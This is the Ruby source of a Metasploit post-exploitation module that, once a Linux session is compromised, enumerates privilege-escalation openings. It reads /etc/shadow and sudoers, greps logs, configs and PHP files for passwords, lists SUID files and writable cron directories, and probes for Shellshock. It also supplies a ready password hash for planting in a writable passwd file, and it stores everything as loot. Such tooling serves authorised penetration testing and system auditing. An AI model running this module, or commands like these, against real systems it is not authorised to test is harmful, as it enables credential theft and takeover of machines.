##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Privilege Escalation Information Gathering',
      'Description'   => %q{
        This module gathers a multitude of information for Linux privilege
        escalation without writing to the target. Based on linuxprivchecker.py
        by Mike Czumak and "Basic Linux Privilege Escalation" by g0tmi1l.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'sn0wfa11 <jhale85446[at]gmail.com>'
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter'],
      'References'    => 
        [
          [ 'URL', 'https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/' ],
          [ 'URL', 'http://www.securitysift.com/download/linuxprivchecker.py' ]
        ]
    ))

    register_options(
      [
        OptInt.new('DELAY', [ true, "Delay on the execute command. (In seconds)", 0])
      ], self.class)
  end

  def run
    final_output = ""

    distro = execute("cat /etc/issue")
    kernel_full = execute("cat /proc/version")
    user = execute("whoami")
    hostname = execute("hostname")
    release = execute("cat /etc/*-release")

    #kernel_number = kernel_full.split(" ")[2].split("-")[0] if kernel_full
    #kernel_split = kernel_full.split(" ")[2].split("-")[0].split(".") if kernel_full
    #kernel_suffix = kernel_full.split(" ")[2].split("-")[1] if kernel_full

    # Print the info
    print_good("Info:")
    print_good("\t#{distro}")
    print_good("\t#{kernel_full}")
    print_good("\tModule running as \"#{user}\" user against #{hostname}")

    final_output << bigline
    final_output << "LINUX PRIVILEGE ESCALATION CHECKS by sn0wfa11"
    final_output << bigline

    print_status("1 / 9 - Getting Basic Info")
    output = "\n[*] BASIC SYSTEM INFO:\n"
    output << prnt("Kernel", kernel_full)    
    output << prnt("Hostname", hostname)
    output << prnt("Operating System", distro)
    output << prnt("Full Release Info", release)
    output << prnt("Current User", user)
    output << get("Current User ID", "id")
    output << get("UDEV - Check for PE if < 141 and Kernel 2.6.x!", "udevadm --version 2>/dev/null")
    output << smline
    final_output << output

    print_status("2 / 9 - Looking for Quick Fails")
    final_output << quick_fails

    print_status("3 / 9 - Getting App and Tool Info")
    final_output << tools_info

    print_status("4 / 9 - Getting Network Info")
    final_output << network_info

    print_status("5 / 9 - Getting Basic File System Info")
    final_output << filesystem_info

    print_status("6 / 9 - Getting User and Environmental Info")
    final_output << userenv_info

    print_status("7 / 9 - Getting File and Directory Permissions")
    final_output << file_dir_perms

    print_status("8 / 9 - Getting Processes and Application Information")
    final_output << proc_aps_info(release)

    print_status("9 / 9 - Getting Extra Information")
    final_output << extra_info

    final_output << bigline
    save(final_output)
  end

  ###########################################
  # Managment Functions
  ###########################################

  def bigline
    "\n=================================================================================================\n"
  end

  def smline
    "\n-------------------------------------------------------------------------------------------------\n"
  end

  def save(data, ctype = 'text/plain')
    ltype = "linux.enum.system"
    loot = store_loot(ltype, ctype, session, data, "priv_check.txt", "LINUX PRIV CHECK")
    print_good("LINUX PRIV CHECK stored in #{loot}")
  end

  def execute(cmd)
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd)
    sleep(datastore['DELAY']) if datastore['DELAY']
    vprint_line("#{output}")
    return output
  end

  def get(msg, cmd)
    output = "\n"
    output << "[+] #{msg}\n"
    result = execute(cmd)
    result.lines.each do |line|
      output << "    #{line}" if line.strip != ""
    end
    output << "\n"
    return output
  end

  def prnt(msg, input)
    output = "\n"
    output << "[+] #{msg}\n"
    output << format(input)
    return output
  end

  def format(input)
    output = ""
    input.lines.each do |line|
      output << "    #{line}" if line.strip != ""
    end
    output << "\n"
    return output
  end

  ###########################################
  # Enumeration Functions
  ###########################################

  def quick_fails
    output = "\n[*] QUICK FAILS:\n"
    output << shellshock
    output << mysql_nopass
    output << mysql_as_root
    output << world_writable_passwd
    output << world_writable_shadow
    output << readable_shadow
    output << world_writable_suid
    output << smline
    return output
  end

  def tools_info
    output = "\n[*] INSTALLED LANGUAGES/TOOLS:\n"
    output << get("Installed Tools", "which awk perl python ruby gcc g++ vi vim nano nmap find netcat nc ncat wget tftp ftp 2>/dev/null")
    output << smline
    return output
  end

  def network_info
    output = "\n[*] NETWORKING INFO:\n"
    output << get("Interfaces", "/sbin/ifconfig -a")
    output << get("Netstat", "netstat -antup | grep -v 'TIME_WAIT'")
    output << get("Route", "route")
    output << get("Iptables", "iptables -L 2>/dev/null")
    output << smline
    return output
  end

  def filesystem_info
    output = "\n[*] FILESYSTEM INFO:\n"
    output << get("Mount results", "mount")
    output << get("fstab entries", "cat /etc/fstab 2>/dev/null")
    output << get("Scheduled cron jobs", "ls -la /etc/cron* 2>/dev/null")
    output << get("Crontab for current user", "crontab -l")
    output << get("Writable cron dirs", "ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null")
    output << smline
    return output
  end

  def userenv_info
    output = "\n[*] USER AND ENVIRONMENTAL INFO:\n"
    output << get("Logged in User Activity", "w 2>/dev/null")
    output << get("Super Users Found:", "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'")
    output << get("Environment", "env 2>/dev/null | grep -v 'LS_COLORS'")
    output << get("Root and Current User History (depends on privs)", "ls -la ~/.*_history; ls -la /root/.*_history 2>/dev/null")
    output << get("Sudoers (privileged)", "cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null")
    output << get("All Users", "cat /etc/passwd")
    output << get("User With Potential Login Rights", "cat /etc/passwd | grep '/bin/bash'")
    output << get("Group List", "cat /etc/group")
    output << smline
    return output
  end

  def file_dir_perms
    output = "\n[*] FILE AND DIRECTORY PERMISSIONS/CONTENTS:\n"
    output << get("Protected Files", "ls -al /etc/passwd; ls -al /etc/shadow; ls -al /etc/group")
    output << get("Logfile Permissions", "ls -al /var/log/syslog 2>/dev/null; ls -al /var/log/auth.log 2>/dev/null")
    output << get("World Writeable Directories for User/Group 'Root'", "find / \\( -wholename '/home/homedir*' -prune \\) -o \\( -type d -perm -0002 \\) -exec ls -ld '{}' ';' 2>/dev/null | grep root")
    output << get("World Writeable Directories for Users other than Root", "find / \\( -wholename '/home/homedir*' -prune \\) -o \\( -type d -perm -0002 \\) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root")
    output << get("World Writable Files", "find / \\( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \\) -o \\( -type f -perm -0002 \\) -exec ls -l '{}' ';' 2>/dev/null")
    output << get("Checking if root's home folder is accessible", "ls -ahlR /root 2>/dev/null")
    output << get("SUID Files", "find / \\( -perm -4000 \\) -exec ls -ld {} \\; 2>/dev/null")
    output << get("SGID Files and Directories", "find / \\( -perm -2000 \\) -exec ls -ld {} \\; 2>/dev/null")
    output << get("PHP Files Containing Keyword: 'password'", "find / -name '*.php' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWORD' 2>/dev/null")
    output << smline
    return output
  end

  def proc_aps_info(release)
    output = "\n[*] PROCESSES AND APPLICATIONS:\n"
    output << get_services(release)
    output << get("Current processes", "ps aux | awk '{print $1,$2,$9,$10,$11}'")
    output << get("Apache Version and Modules", "apache2 -v 2>/dev/null; apache2ctl -M 2>/dev/null; httpd -v 2>/dev/null; apachectl -l 2>/dev/null")
    output << get_packages(release)
    output << smline
    return output
  end

  def extra_info
    output = "\n[*] Extra Information:\n"
    output << get("Apache Config File", "cat /etc/apache2/apache2.conf 2>/dev/null")
    output << get("Logs Containing Keyword: 'password'", "find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWORD' 2>/dev/null")
    output << get("Config Files Containing Keyword: 'password'", "find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWORD' 2>/dev/null")
    output << get("[FINAL CHECK] - Listing other home folders", "ls -ahlR /home 2>/dev/null")
    return output
  end

  ###########################################
  # Specific Distro Functions
  ###########################################

  def get_services(release)
    output = "\n[+] Current Services\n"
    case release.downcase
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      output << execute("/sbin/chkconfig --list 2>/dev/null")
    when /slackware/
      output << "\nEnabled:\n*************************\n"
      output << execute("ls -F /etc/rc.d | grep \'*$\' 2>/dev/null")
      output << "\n\nDisabled:\n*************************\n"
      output << execute("ls -F /etc/rc.d | grep \'[a-z0-9A-z]$\' 2>/dev/null")
    when /ubuntu|debian/
      output << execute("service --status-all 2>/dev/null")
    when /gentoo/
      output << execute("/bin/rc-status --all 2>/dev/null")
    when /arch/
      output << execute("/bin/egrep '^DAEMONS' /etc/rc.conf 2>/dev/null")
    else
      output << "Could not determine the Linux Distribution to get list of configured services\n"
    end
    output << "\n"
    return output
  end

  def get_packages(release)
    output = "\n[+] Installed Packages\n"
    case release.downcase
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      output << execute("rpm -qa | sort -u")
    when /slackware/
      output << execute("ls /var/log/packages")
    when /ubuntu|debian/
      output << execute("dpkg -l | awk '{$1=$4=\"\"; print $0}'")
    when /gentoo/
      output << execute("equery list")
    when /arch/
      output << execute("/usr/bin/pacman -Q")
    else
      output << "Could not determine package manager to get list of installed packages\n"
    end
    output << "\n"
    return output
  end

  ###########################################
  # Quck-Fail Checks
  ###########################################

  def shellshock
    output = ""
    result = execute("env X='() { :; }; echo \"CVE-2014-6271 vulnerable\"' bash -c date\n")
    if result =~ /vulnerable/
      print_good("QUICKFAIL!: Shellshock Vulnerable! Look for process running as root to exploit!")
      output << "\n[+] QUICKFAIL!: Shellshock Vulnerable! Look for process running as root to exploit!\n"
      return output
    end
    return ""
  end

  def mysql_nopass
    output = ""
    result = execute("mysql -uroot -e 'show databases;' 2>/dev/null")
    if result.downcase =~ /database/
      print_good("QUICKFAIL!: mysql does not require a password for root user!")
      output << "\n[+] QUICKFAIL!: mysql does not require a password for root user!\n"
      output << format(result)
      return output
    end
    return ""
  end

  def mysql_as_root
    output = ""
    result = execute("ps aux | grep mysql | grep root | grep -v grep")
    if result.downcase =~ /mysql/
      print_good("QUICKFAIL!: mysql is running as root!")
      output << "\n[+] QUICKFAIL!: mysql is running as root!\n"
      output << format(result)
      return output
    end
    return ""
  end

  def world_writable_passwd
    output = ""
    result = execute("ls -al /etc/passwd | awk '$1 ~ /^........w./' 2>/dev/null")
    if result.downcase =~ /passwd/
      print_good("QUICKFAIL!: /etc/passwd is world writable!")
      output << "\n[+] QUICKFAIL!: /etc/passwd is world writable!\n"
      output << format(result)
      output << "Use hash: $1$5wAs2Vek$MolttqqR2ngg29PV6DacY1\n"
      output << "Password: 12345\n"
      output << "\"That's the same combination I have on my luggage!\"\n"
      return output
    end
    return ""
  end

  def world_writable_shadow
    output = ""
    result = execute("ls -al /etc/shadow | awk '$1 ~ /^........w./' 2>/dev/null")
    if result.downcase =~ /passwd/
      print_good("QUICKFAIL!: /etc/shadow is world writable!")
      output << "\n[+] QUICKFAIL!: /etc/shadow is world writable!\n"
      output << format(result)
      output << "Use hash: $1$5wAs2Vek$MolttqqR2ngg29PV6DacY1\n"
      output << "Password: 12345\n"
      output << "\"That's the same combination I have on my luggage!\"\n"
      return output
    end
    return ""
  end

  def readable_shadow
    output = ""
    result = execute("cat /etc/shadow 2>/dev/null")
    if result != ""
      print_good("QUICKFAIL!: /etc/shadow is readable!")
      output << "\n[+] QUICKFAIL!: /etc/shadow is readable!\n"
      output << format(result)
      return output
    end
    return ""
  end

  def world_writable_suid
    output = ""
    result = execute("ls -alR / 2>/dev/null | awk '$1 ~ /^...s....w./' | awk '$3 ~ /root/'")
    if result.downcase =~ /root/
      print_good("QUICKFAIL!: World Writable Root SUID File!")
      output << "\n[+] QUICKFAIL!: World Writable Root SUID File!\n"
      output << format(result)
      return output
    end
    return ""
  end
end
